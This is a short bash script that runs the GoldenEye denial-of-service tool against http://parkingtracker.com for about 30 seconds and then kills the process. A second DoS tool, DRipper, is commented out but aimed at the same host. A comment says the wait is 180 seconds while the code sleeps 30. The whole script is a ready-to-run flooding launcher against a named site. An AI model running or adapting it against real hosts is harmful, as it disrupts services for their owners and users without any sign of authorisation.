#!/bin/bash

# Define the commands in an array
commands=(
  "python3 ./dos_ge/goldeneye.py http://parkingtracker.com"
  # "python3 ./dos_ripper_/DRipper.py -s parkingtracker.com"
)

# Loop through each command
for cmd in "${commands[@]}"; do
  echo "Starting command: $cmd"
  # Start the command in the background
  $cmd &
  # Get the PID of the command just run
  cmd_pid=$!
  # Wait for 180 seconds before attempting to kill the command
  sleep 30
  # Attempt to kill the process
  kill $cmd_pid 2>/dev/null

  # Wait a moment to let the kill command take effect
  sleep 2

  # Check if the process is still running
  if kill -0 $cmd_pid 2>/dev/null; then
    echo "Process $cmd_pid resisted termination, attempting force kill..."
    kill -9 $cmd_pid
    sleep 1  # Give some time for the process to be forcefully stopped
    if kill -0 $cmd_pid 2>/dev/null; then
      echo "Failed to kill process $cmd_pid"
    else
      echo "Process $cmd_pid was successfully killed with force."
    fi
  else
    echo "Process $cmd_pid was successfully killed."
  fi
done

echo "All commands have been executed."
